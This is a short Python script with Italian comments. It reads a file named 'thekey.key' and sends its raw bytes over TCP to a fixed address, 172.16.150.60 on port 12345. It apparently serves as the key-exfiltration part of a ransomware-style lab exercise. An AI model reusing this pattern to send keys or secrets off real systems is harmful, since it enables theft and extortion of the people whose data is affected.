import socket

# Legge il contenuto del file 'thekey.key'
with open('thekey.key', 'rb') as file:
    contenuto_file = file.read()

# Incapsula il contenuto dentro una variabile
key = contenuto_file

# Configurazione del client
indirizzo_server = '172.16.150.60'
porta_server = 12345

# Crea un socket TCP/IP
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connetti il client al server
client_socket.connect((indirizzo_server, porta_server))

# Invia la chiave come oggetto di tipo bytes
client_socket.sendall(key)

# Chiudi la connessione
client_socket.close()
